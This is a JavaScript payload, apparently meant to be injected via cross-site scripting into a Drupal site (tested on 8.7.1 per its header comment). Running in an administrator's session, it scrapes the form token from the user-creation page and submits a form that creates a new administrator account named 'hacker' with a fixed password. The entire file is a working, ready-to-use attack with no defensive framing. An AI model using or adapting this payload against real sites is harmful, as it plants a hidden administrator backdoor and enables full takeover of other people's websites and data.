/*
Target: Drupal - tested on 8.7.1 but probably works on older versions
Action: Create a new administrative user with username "hacker" and password "trees are nice 135"
Context: Must be executed in the context of an administrator user
*/ 

var drupal_root = "" //don't put a trailing slash
var req = new XMLHttpRequest();
var url = drupal_root + "/admin/people/create";
var regex = /ken" value="([^"]*?)"/g;
req.open("GET", url, false);
req.send();
var token = regex.exec(req.responseText);
var token = token[1];
req.open("POST", url, true);
req.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8");
req.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
req.setRequestHeader("Content-Type", "multipart\/form-data; boundary=---------------------------16060183381995026921942491393");
req.withCredentials = true;
var body = "-----------------------------16060183381995026921942491393\r\n" + 
  "Content-Disposition: form-data; name=\"mail\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------16060183381995026921942491393\r\n" + 
  "Content-Disposition: form-data; name=\"name\"\r\n" + 
  "\r\n" + 
  "hacker\r\n" + 
  "-----------------------------16060183381995026921942491393\r\n" + 
  "Content-Disposition: form-data; name=\"pass[pass1]\"\r\n" + 
  "\r\n" + 
  "trees are nice 135\r\n" + 
  "-----------------------------16060183381995026921942491393\r\n" + 
  "Content-Disposition: form-data; name=\"pass[pass2]\"\r\n" + 
  "\r\n" + 
  "trees are nice 135\r\n" + 
  "-----------------------------16060183381995026921942491393\r\n" + 
  "Content-Disposition: form-data; name=\"status\"\r\n" + 
  "\r\n" + 
  "1\r\n" + 
  "-----------------------------16060183381995026921942491393\r\n" + 
  "Content-Disposition: form-data; name=\"roles[administrator]\"\r\n" + 
  "\r\n" + 
  "administrator\r\n" + 
  "-----------------------------16060183381995026921942491393\r\n" + 
  "Content-Disposition: form-data; name=\"user_picture[0][fids]\"\r\n" + 
  "\r\n" + 
  "\r\n" + 
  "-----------------------------16060183381995026921942491393\r\n" + 
  "Content-Disposition: form-data; name=\"user_picture[0][display]\"\r\n" + 
  "\r\n" + 
  "1\r\n" + 
  "-----------------------------16060183381995026921942491393\r\n" + 
  "Content-Disposition: form-data; name=\"form_token\"\r\n" + 
  "\r\n" + 
  token + "\r\n" + 
  "-----------------------------16060183381995026921942491393\r\n" + 
  "Content-Disposition: form-data; name=\"form_id\"\r\n" + 
  "\r\n" + 
  "user_register_form\r\n" + 
  "-----------------------------16060183381995026921942491393\r\n" + 
  "Content-Disposition: form-data; name=\"contact\"\r\n" + 
  "\r\n" + 
  "1\r\n" + 
  "-----------------------------16060183381995026921942491393\r\n" + 
  "Content-Disposition: form-data; name=\"timezone\"\r\n" + 
  "\r\n" + 
  "Australia/Brisbane\r\n" + 
  "-----------------------------16060183381995026921942491393\r\n" + 
  "Content-Disposition: form-data; name=\"op\"\r\n" + 
  "\r\n" + 
  "Create new account\r\n" + 
  "-----------------------------16060183381995026921942491393--\r\n";
var aBody = new Uint8Array(body.length);
for (var i = 0; i < aBody.length; i++)
  aBody[i] = body.charCodeAt(i); 
req.send(new Blob([aBody]));
